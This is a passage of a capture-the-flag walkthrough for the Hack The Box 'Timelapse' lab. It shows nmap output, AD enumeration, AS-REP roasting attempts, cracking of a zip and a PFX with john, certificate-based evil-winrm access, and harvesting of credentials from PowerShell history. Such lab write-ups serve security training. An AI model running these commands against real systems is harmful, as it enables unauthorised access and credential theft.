</span></span><span style="display:flex;"><span>Stats: 0:02:48 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span>Service scan Timing: About 11.76% <span style="color:#66d9ef">done</span>; ETC: 06:18 <span style="color:#f92672">(</span>0:00:45 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.123.90
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.039s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65518</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE           VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain            Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-11 14:17:46Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc             Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl?
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: timelapse.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl?
</span></span><span style="display:flex;"><span>5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-11-11T14:19:20+00:00; +8h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>dc01.timelapse.htb
</span></span><span style="display:flex;"><span>| Not valid before: 2021-10-25T14:05:29
</span></span><span style="display:flex;"><span>|_Not valid after:  2022-10-25T14:25:29
</span></span><span style="display:flex;"><span>| tls-alpn:
</span></span><span style="display:flex;"><span>|_  http/1.1
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf            .NET Message Framing
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc             Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49674/tcp open  msrpc             Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49695/tcp open  msrpc             Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49724/tcp open  msrpc             Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3:1:1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2024-11-11T14:18:40
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 262.82 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
<h3 id="ldap-389">LDAP <code>389</code>:</h3>
<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
<ul>
<li>
<p>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.</p>
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapire">https://github.com/bloodstiller/ldapire</a></li>
<li><a href="https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb">https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb</a>
<ul>
<li><code>python3 /home/kali/windowsTools/enumeration/ldapire.py $box</code>
<ul>
<li>It will dump general information &amp; also detailed &amp; simple information including:
<ul>
<li>Groups</li>
<li>Users</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Timelapse/scans/ldap%20%20%f0%9f%8d%a3%20main%20%203GiB/7GiB%20%7c%20268kiB/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2022:17:33%20zsh%20%e2%9d%af%20python3%20/home/kali/windowsTools/enumeration/ldapire.py%20$box%0aAttempting%20to%20connect%20to%2010.129.227.113%20with%20SSL...%0aFailed%20to%20connect%20with%20SSL.%0aAttempting%20to%20connect%20to%2010.129.227.113%20with%20non-SSL...%0aConnected%20successfully%20using%20anonymous%20bind.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=timelapse,DC=htb%0a%20%20%20%20CN=Configuration,DC=timelapse,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=timelapse,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=timelapse,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=timelapse,DC=htb">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Timelapse/scans/ldap  üç£ main  3GiB/7GiB | 268kiB/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>üïô 22:17:33 zsh ‚ùØ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.227.113 with SSL...
</span></span><span style="display:flex;"><span>Failed to connect with SSL.
</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.227.113 with non-SSL...
</span></span><span style="display:flex;"><span>Connected successfully using anonymous bind. Retrieving server information...
</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Naming contexts:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionality level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
</span></span><span style="display:flex;"><span>  domainFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  forestFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>+Note+: that any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here‚Äôs a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th>Functional Level Number</th>
          <th>Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>Windows 2000</td>
      </tr>
      <tr>
          <td>1</td>
          <td>Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td>2</td>
          <td>Windows Server 2003</td>
      </tr>
      <tr>
          <td>3</td>
          <td>Windows Server 2008</td>
      </tr>
      <tr>
          <td>4</td>
          <td>Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td>5</td>
          <td>Windows Server 2012</td>
      </tr>
      <tr>
          <td>6</td>
          <td>Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td>7</td>
          <td>Windows Server 2016</td>
      </tr>
      <tr>
          <td>8</td>
          <td>Windows Server 2019</td>
      </tr>
      <tr>
          <td>9</td>
          <td>Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li>+Note+:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.)







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC01,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>timelapse,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
</ul>
</li>
</ul>
<h4 id="updating-etc-hosts-and-variables">Updating ETC/HOSTS &amp; Variables:</h4>
<ul>
<li>
<p><strong>Updated Domain &amp; Machine Variables for Testing</strong>:</p>
<ul>
<li>Now that I have this information, I can update the <code>domain</code> and <code>machine</code> variables used in tests:
<ul>
<li><code>update_var domain &quot;timelapse.htb&quot;</code></li>
<li><code>update_var machine &quot;DC01&quot;</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Updating <code>/etc/hosts</code> for DNS and LDAP Queries</strong>:</p>
<ul>
<li>I update my <code>/etc/hosts</code> file to enable tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration and other tools that require DNS or LDAP for queries:
<ul>
<li><code>echo &quot;$box   $domain $machine.$domain&quot; | sudo tee -a /etc/hosts</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="syncing-clocks-for-kerberos-exploitation">Syncing Clocks for Kerberos Exploitation:</h4>
<ul>
<li>Since Kerberos is enabled on this host, it&rsquo;s best practice to sync our clock with the host‚Äôs. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
<ul>
<li><code>sudo ntpdate -s $domain</code></li>
<li>+Note+: I am doing this now as we have the DNS name etc.</li>
</ul>
</li>
</ul>
<h3 id="dns-53">DNS <code>53</code>:</h3>
<ul>
<li><strong>Using dnsenum to enumerate DNS entries</strong>:
<ul>
<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-153014_.png">
</figure>
</li>
<li>Nothing of note.</li>
</ul>
</li>
</ul>
<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
<ul>
<li>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
<ul>
<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-152953_.png">
</figure>
</li>
<li>No hits</li>
</ul>
</li>
</ul>
<h4 id="using-netexec-for-asreproasting">Using netexec for ASReproasting:</h4>
<ul>
<li><strong>We should always try and asreproast with a null/guest session as it can lead to an easy win</strong>:
<ul>
<li><code>netexec ldap $box -u '' -p '' --asreproast asrep.txt</code></li>
<li><code>netexec ldap $box -u guest -p '' --asreproast asrep.txt</code></li>
<li>Neither get hits.</li>
</ul>
</li>
</ul>
<h3 id="smb-445">SMB <code>445</code>:</h3>
<h4 id="attempting-to-connect-with-null-and-guest-sessions">Attempting to connect with NULL &amp; Guest sessions:</h4>
<ul>
<li><strong>This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold</strong>:
<ul>
<li>
<p><code>netexec smb $box -u 'guest' -p '' --shares</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-152454_.png">
</figure>
</li>
<li>We have read access to shares as the guest user.</li>
</ul>
</li>
<li>
<p><code>netexec smb $box -u '' -p '' --shares</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-152616_.png">
</figure>
</li>
<li>Null session disabled.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="enumerating-users-with-impacket-lookupsid">Enumerating Users with Impacket-lookupsid:</h4>
<ul>
<li><strong>We can use</strong> <code>impacket-lookupsid</code> <strong>to enumerate users on the domain</strong>:
<ul>
<li><code>impacket-lookupsid $domain/guest@$machine.$domain -domain-sids</code></li>
<li><code>impacket-lookupsid guest@$box -domain-sids -no-pass</code></li>
<li>+Note+: As we are using the &ldquo;Guest&rdquo; account we can just hit enter for a blank password</li>
<li><figure><img src="/ox-hugo/2024-11-10-153134_.png">
</figure>
</li>
<li>Interesting users, I will add them to my user list.</li>
</ul>
</li>
</ul>
<h3 id="using-smbclient-to-enumerate-shares">Using smbclient to enumerate shares:</h3>
<ul>
<li><code>smbclient -U 'guest' &quot;\\\\$box\\shares&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-153442_.png">
</figure>
</li>
</ul>
<h3 id="finding-laps-related-documentation-on-in-the-helpdesk-share">Finding LAPS related documentation on in the HelpDesk share:</h3>
<ul>
<li>
<p><strong>Searching the helpdesk share shows alot of LAPS related information</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-153939_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I download all the files</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-154048_.png">
</figure>
</li>
<li>I check the documentation but it&rsquo;s all official documentation by microsoft.</li>
<li>+Note+: This does not directly tell us anything however we can most likely infer that LAPS is in use on this box somewhere.</li>
</ul>
</li>
</ul>
<h4 id="local-administrator-password-solution--laps--primer">Local Administrator Password Solution (LAPS) Primer:</h4>
<ul>
<li>
<p><strong>LAPS</strong> is a Microsoft tool designed to manage and secure local administrator passwords on domain-joined machines by generating unique, random passwords.</p>
</li>
<li>
<p><strong>Purpose</strong>: Prevents lateral movement and credential theft across systems by ensuring each machine has a unique local administrator password.</p>
</li>
<li>
<p><strong>How it Works</strong>:</p>
<ul>
<li>Passwords are stored securely in <strong>Active Directory (AD)</strong> and tied to individual machines.</li>
<li>Passwords are updated regularly based on <strong>Group Policy settings</strong>.</li>
<li>Only authorized users/groups have access to these stored passwords.</li>
</ul>
</li>
<li>
<p><strong>Key Features:</strong></p>
<ul>
<li><strong>Automatic Password Rotation</strong>: Random passwords are generated and regularly updated, reducing exposure from old or reused passwords.</li>
<li><strong>Secure Storage</strong>: Passwords are stored in AD as an attribute of the computer object, protected by AD permissions.</li>
<li><strong>Access Control</strong>: Administrators can control who can view the passwords, ensuring limited and audited access.</li>
</ul>
</li>
<li>
<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Mitigates Lateral Movement</strong>: Reduces the risk of a compromised local admin account being used to move laterally across systems.</li>
<li><strong>Enhanced Security</strong>: Unique passwords for each device eliminate risks associated with shared or default passwords.</li>
<li><strong>Simplicity and Automation</strong>: Password rotation and management are automated, decreasing administrative overhead.</li>
</ul>
</li>
<li>
<p><strong>Common Use Cases:</strong></p>
<ul>
<li>Enforcing strong local admin credentials across enterprise environments.</li>
<li>Reducing credential reuse and enhancing compliance for audits and regulatory standards.</li>
</ul>
</li>
<li>
<p><strong>Limitations</strong>:</p>
<ul>
<li>Only works on <strong>domain-joined</strong> Windows machines.</li>
<li>Requires <strong>Active Directory schema modification</strong>, which may need approval from IT governance.</li>
</ul>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<h3 id="finding-a-backup-in-the-dev-share">Finding a backup in the Dev share:</h3>
<ul>
<li>
<p><strong>There is a file called</strong> <code>winrm_backup.zip</code> <strong>in the Dev share</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-153547_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I download it</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-153618_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I try and open the file but it&rsquo;s password protected</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-154517_.png">
</figure>
</li>
<li>What is interesting is, is the fact that there is a <code>.pfx</code> cert in here, which should allow us to authenticate.</li>
</ul>
</li>
</ul>
<h4 id="pfx-certificates-in-windows-a-primer">PFX Certificates in Windows: A Primer</h4>
<p><strong>What&rsquo;s Inside a PFX File</strong>:</p>
<ul>
<li>
<p>A PFX file (also known as PKCS#12) is like a secure digital envelope containing two essential pieces:</p>
<ul>
<li>A public key that others use to encrypt data or verify your identity</li>
<li>A private key that only you have, used to decrypt data or prove it&rsquo;s really you</li>
</ul>
</li>
<li>
<p><strong>Why They Matter in Windows</strong>:</p>
<ul>
<li>In the Windows world, PFX certificates handle several crucial security tasks:
<ul>
<li>Securing web traffic through HTTPS</li>
<li>Protecting Remote Desktop connections</li>
<li>Enabling secure email in Outlook</li>
<li>Verifying the authenticity of code and scripts</li>
<li>Supporting Single Sign-On across applications</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>How Windows Handles PFX Files</strong>:</p>
<ul>
<li>
<p>Windows stores these certificates in its Certificate Store, which you can think of as a secure vault for your digital credentials. The system protects the private keys and manages access to them, while making the public certificates available when needed.</p>
</li>
<li>
<p>Working with certificates in Windows is straightforward - the system provides built-in tools like the Certificate Import Wizard and Certificate Manager (certlm.msc) to handle PFX files. Once imported, Windows takes care of the heavy lifting of using these certificates for authentication and encryption.</p>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Important Considerations</strong>:
<ul>
<li>A few key points to keep in mind about PFX certificates in Windows:
<ul>
<li>They&rsquo;re usually password-protected for additional security</li>
<li>Windows can store them at either the user or machine level</li>
<li>The system handles key storage security automatically</li>
<li>Not all applications can use PFX format directly</li>
<li>Managing multiple certificates across systems requires planning</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="cracking-the-encrypted-zip-file-using-zip2john-and-john">Cracking the encrypted zip file using zip2john &amp; john:</h3>
<ul>
<li>
<p>As the zip file is password protected we can use zip2john to generate a hash we can then crack:</p>
<ul>
<li><code>zip2john winrm_backup.zip &gt;&gt; winrm.hash</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-155523_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Cracking the hash</strong>:</p>
<ul>
<li><code>john winrm.hash --wordlist=/home/kali/Wordlists/rockyou.txt</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-155552_.png">
</figure>
</li>
<li>It cracks</li>
</ul>
</li>
<li>
<p><strong>Extracting the</strong> <code>.pfx</code>:</p>
<ul>
<li>It works</li>
<li><figure><img src="/ox-hugo/2024-11-10-155724_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="attempting-to-extract-the-private-keys-from-the-dot-pfx">Attempting to extract the private keys from the <code>.pfx</code>:</h3>
<ul>
<li>Initially I try and extract the certificate &amp; key from the <code>pfx</code> but the password is not accepted:
<ul>
<li><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth.pem -nodes</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-160149_.png">
</figure>
</li>
<li>No dice.</li>
</ul>
</li>
</ul>
<h3 id="cracking-the-dot-pfx-using-pfx2john-and-john">Cracking the <code>.pfx</code> using pfx2john &amp; john:</h3>
<ul>
<li>
<p>Like the zip before we can crack this pfx file to extract the password.</p>
</li>
<li>
<p><strong>Generate a hash using</strong> <code>pfx2john</code></p>
<ul>
<li><code>pfx2john legacyy_dev_auth.pfx &gt;&gt; pfx.hash</code></li>
</ul>
</li>
<li>
<p><strong>Crack</strong>:</p>
<ul>
<li><code>john pfx.hash --wordlist=/home/kali/Wordlists/rockyou.txt</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-160440_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="extracting-the-private-key-and-certificate-with-openssl-from-a-dot-pfx">Extracting the private key &amp; certificate with openssl from a <code>.pfx</code>:</h3>
<ul>
<li>
<p><strong>Extract the private key</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="openssl%20pkcs12%20-in%20legacyy_dev_auth.pfx%20-nocerts%20-out%20legaccy_dev_auth-priv-key.pem%20-nodes">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legaccy_dev_auth-priv-key.pem -nodes</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-160919_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Extract the certificate</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="openssl%20pkcs12%20-in%20legacyy_dev_auth.pfx%20-nokeys%20-out%20legaccy_dev_auth-cert.pem%20-nodes">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legaccy_dev_auth-cert.pem -nodes</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-160954_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="connecting-with-evil-winrm-to-the-host-using-certificates">Connecting with evil-winrm to the host using certificates:</h3>
<ul>
<li>
<p>As we have extracted both the key and cert from the <code>.pfx</code> we can now authenticate with <code>evil-winrm</code></p>
<ul>
<li><code>evil-winrm -i $box -c legaccy_dev_auth-cert.pem -k legaccy_dev_auth-priv-key.pem -S</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-161634_.png">
</figure>
</li>
<li>+Note+: See how we used <code>S</code> for ssl as we are using cert based authentication.</li>
</ul>
</li>
<li>
<p><strong>Grab our user flag</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-162152_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Check users on the host</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-162240_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
<h3 id="general-enumeration">General Enumeration:</h3>
<h4 id="check-group-membership">Check group membership:</h4>
<ul>
<li><strong>I check what groups we are part of</strong>:
<ul>
<li><code>whoami /groups</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-194407_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="check-privileges">Check privileges:</h4>
<ul>
<li><strong>Check our privs</strong>:
<ul>
<li><code>whoami /priv</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-194714_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="checking-powershell-history">Checking PowerShell history:</h3>
<p>As our user is part of the legacy devs there may be some interesting information in their PowerShell history.</p>
<ul>
<li><strong>Check the file exists</strong>:
<ul>
<li><code>(Get-PSReadLineOption).HistorySavePath</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-201404_.png">
</figure>
</li>
<li>It does, lets download.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>I go to download it but it fails</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-201624_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I check the folder and can see the name of the file is actually</strong> <code>ConsoleHost_history.txt</code></p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-201758_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I download it</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-201832_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="finding-clear-text-credentials-in-the-powershell-history-file">Finding clear text credentials in the PowerShell history file:</h3>
<ul>
<li>
<p>Looking through the file I find the clear text creds for the <code>svc_deploy</code> service account:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-202015_.png">
</figure>
</li>
</ul>
</li>
<li>
<p>I test the creds &amp; they are valid:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-202350_.png">
</figure>
</li>
</ul>
</li>
</ul>
